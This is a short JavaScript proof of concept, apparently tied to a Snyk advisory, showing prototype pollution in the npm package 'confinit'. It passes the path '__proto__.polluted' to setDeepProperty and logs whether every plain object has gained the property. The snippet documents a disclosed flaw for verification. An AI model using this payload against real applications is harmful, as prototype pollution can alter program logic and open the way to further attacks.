// //https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
// test("prototype pollution in confinit", () => {
  const root = require("confinit");
  const payload = "__proto__.polluted";

console.log({}.polluted);

  root.setDeepProperty({}, payload, "yes");

console.log({}.polluted);
// });
